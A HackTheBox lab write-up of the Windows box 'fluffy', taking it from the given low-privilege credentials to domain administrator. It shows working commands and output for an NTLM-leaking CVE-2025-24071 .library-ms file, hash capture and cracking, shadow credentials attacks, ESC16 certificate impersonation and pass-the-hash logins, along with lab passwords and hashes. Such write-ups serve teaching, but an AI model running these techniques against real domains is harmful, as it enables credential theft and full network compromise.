---
title: HackTheBox - fluffy writeup (Windows/Easy)
categories: [HackTheBox]
tags: [HackTheBox, nmap, kerberos, nxc, CVE-2025-24071, library-ms, responder, NTLM, john, GenericWrite, certipy, ShadowCredentials, evil-winrm, 1.3.6.1.4.1.311.25.2, szOID_NTDS_CA_SECURITY_EXT, ESC16]
render_with_liquid: false
---
`fluffy` is an assume-breach box where you're given the credentials of `j.fleischman`, for this box I exploited `CVE-2025-24071` to get `p.agila`'s credentials, then I abused a few `GenericWrite`s to work my way up to `winrm_svc` and get the flag, then for the administrator part a certificate authority vulnerable to ESC16 to generate a authentication certificate on behalf of the administrator user

## Recon

I run nmap on the host which found many open ports
```bash
$ nmap -sSCV 10.10.11.69 -oA fluffy
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-15 06:26:17Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-15T06:27:41+00:00; +6h59m55s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-15T06:27:41+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-15T06:27:41+00:00; +6h59m55s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-15T06:27:41+00:00; +6h59m56s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-09-15T06:27:03
|_  start_date: N/A
|_clock-skew: mean: 6h59m55s, deviation: 0s, median: 6h59m54s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.94 seconds
```

we have a few things leading to the fact that we're dealing with an active directory domain controller:
- `Simple DNS Plus` which is the typical DNS server in an active directory environment
-  kerberos, ldap and smb
we also get the DNS entry of the domain `fluffy.htb`, and the DC `DC01.fluffy.htb`

I run `nxc` to generate the hosts file for me
```bash
nxc smb 10.10.11.69 --generate-hosts-file /tmp/hosts
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) (Null Auth:True)
```

which generates the following
``` bash
10.10.11.69     DC01.fluffy.htb fluffy.htb DC0
```

## p.agila

I used the credentials initially given to me to enumerate the shares, where I found an `IT` shares with `READ,WRITE` permissions

```
$ nxc smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

upon connection to the share I found an `Upgrade_Notice.pdf`

```bash
$  
Can''t load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 15 07:42:40 2025
  ..                                  D        0  Mon Sep 15 07:42:40 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025
ge
		5842943 blocks of size 4096. 2234967 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (124.3 KiloBytes/sec) (average 124.3 KiloBytes/sec)
```

the PDF mentioned a few vulnerabilities out target system was suffering from, an interesting one is CVE-2025-24071

![fluffy_upgrade_notice.png.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/fluffy/fluffy_upgrade_notice.png)

### CVE-2025-24071
I bit of googling reveals the following about the CVE
```
CVE-2025-24071 is a vulnerability in Windows File Explorer that allows unauthorized access to sensitive information
...
The issue arises from the implicit trust and automatic file parsing behavior of `.library-ms` files in Windows Explorer. An [unauthenticated] attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash
```

I found this [nice POC](https://github.com/0x6rss/CVE-2025-24071_PoC) that let me generate a malicious file which will send an authentication request back to my machine, then we could use `responder` tool to catch it and extract the `NTLM` hash of the user sending it

```bash
[ arch@jeff | ~/CVE-2025-24071_PoC ] (main)
$ ls
poc.py  README.md
[ arch@jeff | ~/CVE-2025-24071_PoC ] (main)
$ python poc.py
Enter your file name: exploit.zip
Enter IP (EX: 192.168.1.162): 10.10.14.3
completed
(01:16:14) [ arch@jeff | ~/CVE-2025-24071_PoC ] (main)
$ ls
exploit.zip  poc.py  README.md
```

we can see `exploit.zip` being created, which if we examine it, we'll find `exploit.zip.library-ms` inside, which indeed points to our IP

```bash
$ unzip exploit.zip
Archive:  exploit.zip
  inflating: exploit.zip.library-ms
[ arch@jeff | ~/CVE-2025-24071_PoC ] (main)
$ cat exploit.zip.library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.3\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

I uploaded this file to `IT` share since it's writable, then watched to see `p.agila`'s NTML hash appear in my terminal

```bash
$ sudo responder -I tun0 -v
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:b875f3d7e0c4a7b8:96E4777399D98F8E573967E25CD042E5:010100000000000080BBC06BDF25DC01ECF4DF1D080A77FD0000000002000800340051003200310001001E00570049004E002D004C004F0031003700310059004B004A004E004D00550004003400570049004E002D004C004F0031003700310059004B004A004E004D0055002E0034005100320031002E004C004F00430041004C000300140034005100320031002E004C004F00430041004C000500140034005100320031002E004C004F00430041004C000700080080BBC06BDF25DC01060004000200000008003000300000000000000001000000002000008B0C282EB79192D59E0FBCDA854B11E72064F50BDE278F98482A104BE118D9130A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000
```

then I used `john` to crack the hash and recover `p.agila`'s password

```bash
john agila.ntlm --wordlist=rockyou.txt
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)
1g 0:00:00:01 DONE (2025-08-28 00:43) 0.6896g/s 3115Kp/s 3115Kc/s 3115KC/s prrm18652886..programmer_pt
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

## winrm_svc

I obtained a `TGT` for `p.agila` and used it to run `bloodhound-python` 

```bash
$ getTGT.py 'fluffy.htb/p.agila:prometheusx-303'
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in p.agila.ccache

$ KRB5CCNAME=p.agila.ccache bloodhound-python -k -dc DC01.fluffy.htb -ns 10.10.11.69 -c all -d fluffy.htb -u p.agila -p prometheusx-303 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: DC01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 36S
INFO: Compressing output into 20250921000404_bloodhound.zip
```

sending the result to bloodhound, I found that `p.agila` has `genericAll` on `service accounts` group, so I used it to add `p.agilla` to that group

```bash
$ net rpc group addmem "service accounts" p.agila -U 'fluffy.htb/p.agila%prometheusx-303' -S DC01.fluffy.htb
```

I could then can check that the account was successfully added

```bash
$ net rpc group members "service accounts" -U "fluffy.htb/p.agila%prometheusx-303" -S DC01.fluffy.htb
Cant load /etc/samba/smb.conf - run testparm to debug it
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

from here, the group `service accounts` has a `genericWrite` on the users `CA_SVC`, `LDAP_SVC` and `WINRM_SVC`, the latter was a part of the `remote management users` group, so I targeted him first

![winrm_svc_genericWrite.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/fluffy/winrm_svc_genericWrite.png)

I exploited the `GenericWrite` by performing a shadow credentials attack to get `WINRM_SVC` ntlm hash

```bash
certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc -dc-ip 10.10.11.69

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'aef83a0c372146ba9dc42a3e765a061b'
[*] Adding Key Credential with device ID 'aef83a0c372146ba9dc42a3e765a061b' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'aef83a0c372146ba9dc42a3e765a061b' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

then we can login with the hash to get the flag

```bash
$ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
/home/jeff/.gem/ruby/3.4.0/gems/rexml-3.4.2/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls ../Desktop


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/19/2025  12:26 PM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

## Administrator

since we still have `genericWrite` on 2 users, I went back to bloodhound to see if they're of any value to me, then I found that `CA_SVC` is a member of the `ca publishers` group, which hints on the presence of the beloved ADCS

since `p.agila` is also a member of that group now, I used her account perform another shadow credentials attack to get `CA_SVC`'s hash. I could also have done it with `winrm_svc` now that I have its NT hash


```
$ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fca23679b9ad4ac0a7aec76ba96f3aa0'
[*] Adding Key Credential with device ID 'fca23679b9ad4ac0a7aec76ba96f3aa0' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'fca23679b9ad4ac0a7aec76ba96f3aa0' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

then I used `certipy` to scan for vulnerable certificate templates, and I found the CA to be vulnerable to `ESC16` instead, so all generated certificates will be vulnerable as well

```bash
$ certipy find -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target-ip 10.10.11.69 -vulnerable -enable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

### a bit about ESC16

according to the [amazing Certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), the `1.3.6.1.4.1.311.25.2` security extension aka `szOID_NTDS_CA_SECURITY_EXT`
is vital for is vital for `strong certificate mapping`, enabling DCs to reliably map a certificate to a user or computer account's SID for authentication. when it's disabled on the certificate authority, all generated certificates will lack this SID security extension, making them all behave as if they were configured with `CT_FLAG_NO_SECURITY_EXTENSION` flag enabling `weak certificate mapping` in the domain controllers, thus falling back to weaker, legacy certificate mapping methods (e.g., based on UPN or DNS name found in the certificate's SAN)

all of this just means that if we have write access to an account with enrollment rights, we can change it's UPN to `administrator` then request a certificate for client authentication purposes, and ADCS will happily issue a certificate as if the administrator asked for it, then later we can use it to authenticate as that account, luckily `ca_svc` is a part of the `ca publishers` group and `p.agila` has `GenericWrite` on it  

we can use `certipy` to change the `sa_svc`'s UPN to `administator`

```bash
$ certipy account -u p.agila -p prometheusx-303 -target fluffy.htb -upn administrator -user ca_svc update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

we can check the modification was successfully done, note how the `ca_svc`'s UPN says `administrator` now

```bash
$ certipy account -u p.agila -p prometheusx-303 -target fluffy.htb -upn administrator -user ca_svc read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-09-21T01:06:27+00:00
```

then we can request a certificate to the impersonate the `administrator` account, note how that it got a certificate with UPN `administrator`

```bash
$ certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca fluffy-DC01-CA -upn administrator -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 31
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

we then reverse the UPN change of `ca_svc` user

```bash
$ certipy account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target fluffy.htb -upn ca_svc -user ca_svc update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```

and use the certificate authenticate as `Administrator` and grab his NT hash

```
$ certipy auth -pfx administrator.pfx -u administrator -domain fluffy.htb -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

and finally authenticate to the system using that hash

```bash
$ evil-winrm -i 10.10.11.69 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/19/2025  12:26 PM             34 root.txt
```
